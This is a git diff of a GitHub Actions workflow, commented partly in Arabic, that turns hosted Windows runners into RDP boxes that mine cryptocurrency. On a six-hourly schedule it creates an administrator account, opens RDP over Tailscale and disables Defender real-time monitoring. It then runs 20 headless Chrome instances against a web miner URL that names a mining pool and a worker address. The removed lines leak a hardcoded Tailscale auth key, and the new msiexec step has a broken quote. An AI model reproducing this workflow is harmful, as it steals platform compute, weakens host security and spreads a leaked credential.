@@ -1,40 +1,39 @@
-name: RDP Auto-Recreate with Miner
+name: RDP Auto-Recreate + Miner
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"  # كل 6 ساعات تقريبًا
+    - cron: "0 */6 * * *"  # كل 6 ساعات
 
 env:
   RDP_USER: "RDPUser"
-  RDP_PASSWORD: "DefaultPass!234"  # استخدم secret إذا أردت
-  MAX_RUNTIME: 340    # 5h40m
-  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=20"
+  RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
+  TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
+  MAX_RUNTIME: 340  # 5h40m
+  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
+  CHROME_PATH: "C:\Program Files\Google\Chrome\Application\chrome.exe"
+  WINDOW_COUNT: 20
 
 jobs:
-  rdp-miner:
+  rdp_miner:
     runs-on: windows-latest
-    timeout-minutes: 360  # GitHub limit
+    timeout-minutes: 360
 
     steps:
       - name: Enable RDP
         run: |
           Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 2
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160
 
       - name: Create RDP User
         run: |
           $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
           if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
-              New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
-              Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
-              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
+            New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
+            Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
+            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
           } else {
-              Set-LocalUser -Name $env:RDP_USER -Password $secure
+            Set-LocalUser -Name $env:RDP_USER -Password $secure
           }
 
       - name: Install Tailscale
@@ -42,34 +41,18 @@ jobs:
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installer = "$env:TEMP\tailscale.msi"
           Invoke-WebRequest $tsUrl -OutFile $installer
-          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
+          Start-Process msiexec.exe -ArgumentList "/i `"$installer` /quiet /norestart" -Wait
           Remove-Item $installer
 
-      - name: Validate Tailscale Auth Key
+      - name: Connect Tailscale
         run: |
+          Start-Service Tailscale
+          Start-Sleep -Seconds 5
           $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          Write-Host "Checking Tailscale Auth Key..."
-          $try = 0
-          $maxRetries = 3
-          $success = $false
-          while ($try -lt $maxRetries -and -not $success) {
-              try {
-                  & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname "GH-RDP-${env:GITHUB_RUN_ID}" --reset
-                  $ip = & $tsExe ip -4
-                  if ($ip) {
-                      Write-Host "✅ Tailscale connected, IP: $ip"
-                      $success = $true
-                      echo "TS_IP=$ip" >> $env:GITHUB_ENV
-                  } else {
-                      throw "No IP assigned"
-                  }
-              } catch {
-                  Write-Host "⚠️ Tailscale login failed, retrying..."
-                  Start-Sleep -Seconds 10
-                  $try++
-              }
-          }
-          if (-not $success) { throw "❌ Tailscale Auth Key invalid or cannot connect." }
+          $tsStatus = & $tsExe up --reset --authkey $env:TAILSCALE_AUTH_KEY --hostname "GH-RDP-${{ github.run_id }}"
+          $ip = (& $tsExe ip -4)
+          echo "TS_IP=$ip" >> $env:GITHUB_ENV
+          Write-Host "Tailscale IP: $ip"
 
       - name: Optimize Windows
         run: |
@@ -79,50 +62,61 @@ jobs:
           powercfg /setactive SCHEME_MIN
           Set-MpPreference -DisableRealtimeMonitoring $true
 
-      - name: Launch Headless Miner (20 windows, auto-restart)
+      - name: Start Miner in 20 Windows
         run: |
-          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-          if (-not (Test-Path $chromePath)) {
-              Write-Host "Installing Chrome..."
-              choco install googlechrome -y
+          $jobs = @()
+          function Start-MinerWindow {
+              param($id)
+              Start-Job -ScriptBlock {
+                  param($chromePath, $minerUrl, $id)
+                  while ($true) {
+                      Write-Host "[$id] Starting Chrome Miner..."
+                      Start-Process $chromePath -ArgumentList "--kiosk --headless --disable-gpu --no-first-run --no-default-browser-check --app=$minerUrl" -WindowStyle Hidden
+                      
+                      # Simple monitoring loop
+                      Start-Sleep -Seconds 60
+                      # تحقق إذا توقف Chrome (يمكن إضافة Hashrate check من صفحة الويب)
+                      $chromeRunning = Get-Process chrome -ErrorAction SilentlyContinue
+                      if (-not $chromeRunning) {
+                          Write-Host "[$id] Chrome stopped, restarting..."
+                      }
+                  }
+              } -ArgumentList $env:CHROME_PATH, $env:MINER_URL, $id
           }
 
-          $script = {
-              param($url)
-              while ($true) {
-                  Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
-                    "--headless --disable-gpu --no-sandbox --remote-debugging-port=9222 --app=$url"
-                  Start-Sleep -Seconds 10
-              }
+          for ($i=1; $i -le $env:WINDOW_COUNT; $i++) {
+              $jobs += Start-MinerWindow -id $i
           }
 
-          for ($i=1; $i -le 20; $i++) {
-              Start-Job -ScriptBlock $script -ArgumentList $env:MINER_URL
-          }
+          Write-Host "✅ Started $env:WINDOW_COUNT Chrome Miner windows."
 
-      - name: Display RDP Info
+      - name: Show RDP + Miner Info
         run: |
-          Write-Host "==========================="
-          Write-Host "🚀 RDP READY"
+          $endTime = (Get-Date).AddMinutes($env:MAX_RUNTIME)
+          Write-Host "=============================="
+          Write-Host "🚀 RDP + Miner Active"
           Write-Host "IP: $env:TS_IP"
           Write-Host "User: $env:RDP_USER"
           Write-Host "Pass: $env:RDP_PASSWORD"
           Write-Host "Duration: $env:MAX_RUNTIME min"
-          Write-Host "==========================="
+          Write-Host "Session Ends: $endTime"
+          Write-Host "=============================="
 
-      - name: Keep Session Alive
+      - name: Keep Alive & Monitor Miner
         run: |
           $elapsed = 0
           while ($elapsed -lt $env:MAX_RUNTIME) {
               Write-Host "⏱ RDP + Miner active: $elapsed / $env:MAX_RUNTIME min"
               Start-Sleep -Seconds 60
-              $elapsed++
+              $elapsed += 1
           }
 
       - name: Cleanup
         if: always()
         run: |
-          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          & $tsExe logout
-          Get-Job | Stop-Job | Remove-Job
-          Write-Host "✅ Cleanup completed"
+          Write-Host "🧹 Cleaning up..."
+          Stop-Job -State Running
+          $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
+          if ($chromeProcesses) { $chromeProcesses | Stop-Process -Force }
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
+          Write-Host "✅ Cleanup completed."
